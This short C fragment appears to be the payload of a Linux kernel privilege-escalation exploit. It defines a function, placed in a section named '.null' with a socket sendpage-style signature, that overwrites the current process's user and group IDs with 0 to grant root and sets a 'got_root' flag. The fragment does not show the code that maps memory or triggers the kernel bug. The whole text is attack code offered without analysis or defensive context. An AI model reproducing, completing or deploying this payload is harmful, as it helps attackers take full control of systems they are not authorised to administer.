#include <linux/module.h>
#include <linux/security.h>

int got_root = 0;

int __attribute__((section(".null"))) root_sendpage(void *sk, void *page, int offset, size_t size, int flags)
{
	current->uid = current->euid = 0;
	current->gid = current->egid = 0;
	got_root = 1;
	return -ECONNREFUSED;
}
